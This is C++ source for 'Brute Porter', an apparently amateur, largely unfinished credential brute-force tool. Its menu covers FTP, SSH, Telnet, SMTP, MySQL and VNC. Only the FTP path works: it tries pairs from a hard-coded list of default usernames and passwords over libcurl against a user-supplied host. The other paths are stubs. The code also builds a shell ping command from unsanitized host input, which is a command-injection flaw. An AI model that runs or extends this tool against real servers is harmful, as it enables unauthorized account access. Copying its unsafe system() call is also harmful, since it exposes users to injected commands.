#include <iostream>
#include <unistd.h>
#include <fstream>
#include <curl/curl.h>

using namespace std;

/* color */

// bold color
#define BLACK "\e[1;30m";
#define RED "\e[1;31m";
#define GREEN "\e[1;32m";
#define YELLOW "\e[1;33m";
#define BLUE "\e[1;34m";
#define PURPLE "\e[1;35m";
#define CYAN  "\e[1;36m";
#define WHITE "\e[1;37m";

// Background
#define BRBLACK "\e[40m";
#define BRRED "\e[41m";
#define BRGREEN "\e[42m";
#define BRYELLOW "\e[43m";
#define BRBLUE "\e[44m";
#define BRPURPLE "\e[45m";
#define BRCYAN "\e[46m";
#define BRWHITE "\e[47m";

// reset color
#define RESET "\e[0m";

void banner() {
    system("clear");

    cout << CYAN;
    cout <<"__________________________________________________________________" << endl ;
    cout << RED;
    cout << R"(
    dMMMMb  dMMMMb  dMP dMP dMMMMMMP dMMMMMP
   dMP"dMP dMP.dMP dMP dMP    dMP   dMP
  dMMMMK" dMMMMK" dMP dMP    dMP   dMMMP
 dMP.aMF dMP"AMF dMP.aMP    dMP   dMP
dMMMMP" dMP dMP  VMMMP"    dMP   dMMMMMP)" <<endl;
cout << BLUE;
     cout << R"(
    dMMMMb  .aMMMb  dMMMMb dMMMMMMP dMMMMMP dMMMMb
   dMP.dMP dMP"dMP dMP.dMP   dMP   dMP     dMP.dMP
  dMMMMP" dMP dMP dMMMMK"   dMP   dMMMP   dMMMMK"
 dMP     dMP.aMP dMP"AMF   dMP   dMP     dMP"AMF
dMP      VMMMP" dMP dMP   dMP   dMMMMMP dMP dMP)" <<endl;

    cout << GREEN;
    cout << "\nWilliam Steven (Anon404)" <<endl;
    cout << CYAN;                                                 
    cout<<"__________________________________________________________________\n" << endl << RESET;
}

int isHostUp(const char *ftp_url) {
    cout << CYAN;
    cout << "[!] Checking the host status.....!" << RESET;
    cout << endl;

    string command = "ping -c 1 " + string(ftp_url) + " > /dev/null 2>&1";
    int ihp = system(command.c_str());

    if (ihp == 0) {
        cout << GREEN;
        system("sleep 1");
        cout << "[+] Host is UP" << RESET;
        cout << endl;
        system("sleep 1");
        return 0;
    } else {
        cout << RED;
        cout  << "[-] Host is DOWN" << RESET;
        cout << endl;
        exit(1);
        return -1;
    }
}

bool isPortOpen(){
     
     cout << CYAN;
     cout << "[!] Checking the port is opened or closed.....!" <<endl;
     // logic code here

     return true;
}

int ftp(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        string ftp_dflt[] = {"ftp", "root", "toor", "anonymous", "admin", "user"};

        CURL *curl;
        CURLcode result;

        curl_global_init(CURL_GLOBAL_ALL);
        curl = curl_easy_init();  // Use curl_easy_init() instead of curl_easy_setopt() for initialization

        if (curl == NULL) {
            cout << RED;
            cout << "[!] Failed to initialize curl" << endl;
        } else {
            string ftp_url2 = "ftp://" + string(ftp_url);
            curl_easy_setopt(curl, CURLOPT_URL, ftp_url2.c_str());

    // Loop through default usernames and passwords
            for (const auto& username : ftp_dflt) {
                for (const auto& password : ftp_dflt) {
                    string credentials = username + ":" + password;

                    curl_easy_setopt(curl, CURLOPT_USERPWD, credentials.c_str());  // Set username:password pair

                    result = curl_easy_perform(curl);

                    if (result != CURLE_OK) {
                        cout << RED;
                        cout << "[!] Wrong credentials : " << credentials << endl;
                        cout << curl_easy_strerror(result) <<"\n" <<endl;
                    } else {
                        cout << GREEN;
                        cout << "[+] Successfully logged in 👀 : " << credentials << endl;
                        break;  // Exit loop on successful authentication
                    }
                }
                if (result == CURLE_OK) {
                    break;  // Break outer loop if authentication succeeds
                }
            }
            system("sleep 1");
            cout << YELLOW;
            cout <<"[!] Ops............😐\nNow try with your wordlist\n" <<endl;
            system("sleep 1");
        }
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    } else {
        
    }
    
    /*
        accual code
    */

    return 0;
}

int ssh(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;        
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [22,?] : ";
        cin >> port;      
        isPortOpen();
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [22,?] : ";
        cin >> port;
        
        cout << CYAN;
        cout << "[!] Checking the port is opened or closed.....!" <<endl;
        isPortOpen();
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    }
    
    /*
        accual code
    */

    return 0;
}

int telnet(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;        
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [23,?] : ";
        cin >> port;      
        isPortOpen();
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        
        cout << YELLOW;
        cout << "[?] Enter port [23,?] : ";
        cin >> port;
        
        cout << CYAN;
        cout << "[!] Checking the port is opened or closed.....!" <<endl;
        isPortOpen();
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    }
    
    /*
        accual code
    */

    return 0;
}
int smtp(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;        
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [25,?] : ";
        cin >> port;      
        isPortOpen();
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        
        cout << YELLOW;
        cout << "[?] Enter port [25,?] : ";
        cin >> port;
        
        cout << CYAN;
        cout << "[!] Checking the port is opened or closed.....!" <<endl;
        isPortOpen();
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    }
    
    /*
        accual code
    */

    return 0;
}

int mysql(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;        
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [3306,?] : ";
        cin >> port;      
        isPortOpen();
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [3306,?] : ";
        cin >> port;
        
        cout << CYAN;
        cout << "[!] Checking the port is opened or closed.....!" <<endl;
        isPortOpen();
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    }
    
    /*
        accual code
    */

    return 0;
}

int vnc(){
        
    banner();
    
    cout << YELLOW;
    char dflt;
    cout << "[?] First try with default credentials [Y/n] : ";
    cin >> dflt;
    if(dflt == 'Y' || dflt == 'y'){
        cout << CYAN;
        cout << "[*] starting attack with default credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;        
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [5900,?] : ";
        cin >> port;      
        isPortOpen();
        
        /*
            default credentials checker logic 
        */
        
    }else if(dflt == 'N' || dflt == 'n'){
        
        cout << CYAN;
        cout << "[*] starting attack with user credentials " <<endl;
        string host;
        int port;
        
        cout << YELLOW;
        cout << "[?] Enter Host [Ip/domain] : ";
        cin >> host;
        const char *ftp_url = host.c_str();
        isHostUp(ftp_url);
        
        cout << YELLOW;
        cout << "[?] Enter port [5900,?] : ";
        cin >> port;
        
        cout << CYAN;
        cout << "[!] Checking the port is opened or closed.....!" <<endl;
        isPortOpen();
        
    }else{
        
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");
        
    }
    
    string word,filename;
    cout << YELLOW;
    cout << "[?] Enter wordlist file : ";
    cin >> filename;
    ifstream file(filename);
    if(!file){
        cout << RED;
        cout << "\n[!] Unable to open file.......😪" <<endl;
        system("exit 1");
    }
    
    /*
        accual code
    */

    return 0;
}



int main() {

    banner();
    cout << BRGREEN;
    cout << WHITE;
    cout << "[+] Available  ports \n" <<endl <<RESET;

    cout << GREEN;
    cout << " 1) FTP : 20,21" <<endl;
    cout << " 2) SSH : 22" <<endl;
    cout << " 3) TELNET : 23" <<endl;
    cout << " 4) SMTP : 25" <<endl;
    cout << " 5) MySql : 3306" <<endl;
    cout << " 6) VNC : 5900" <<endl;
    cout << endl << RESET;

    cout << YELLOW;
    int port;
    cout << "[?] Choose port number : ";
    cin >> port ;

    system("sleep 0.5");
    if(port == 1 || port == 20 || port == 21) {
        cout << CYAN;
        cout << "\n[*] Owwh You want FTP port 👀👀" <<endl;
        system("sleep 1");
        ftp();
    } else if(port == 2 || port == 22) {
        cout << CYAN;
        cout << "\n[*] Owwh You want SSH port 👀👀" <<endl;
        system("sleep 1");
        ssh();
    } else if(port == 3 || port == 23) {
        cout << CYAN;
        cout << "\n[*] Owwh You want TELNET port 👀👀" <<endl;
        system("sleep 1");
        telnet();
    } else if(port == 4 || port == 25) {
        cout << CYAN;
        cout << "\n[*] Owwh You want SMTP port 👀👀" <<endl;
        system("sleep 1");
        smtp();
    } else if(port == 5 || port == 3306) {
        cout << CYAN;
        cout << "\n[*] Owwh You want MySql port 👀👀" <<endl;
        system("sleep 1");
        mysql();
    } else if(port == 6 || port == 5900) {
        cout << CYAN;
        cout << "\n[*] Owwh You want VNC port 👀👀" <<endl;
        system("sleep 1");
        vnc();
    } else {
        cout << RED;
        cout << "\n[!] Ops wrong option.......😕" <<endl;
        system("sleep 1 && exit 1");

    }

    return 0;
}
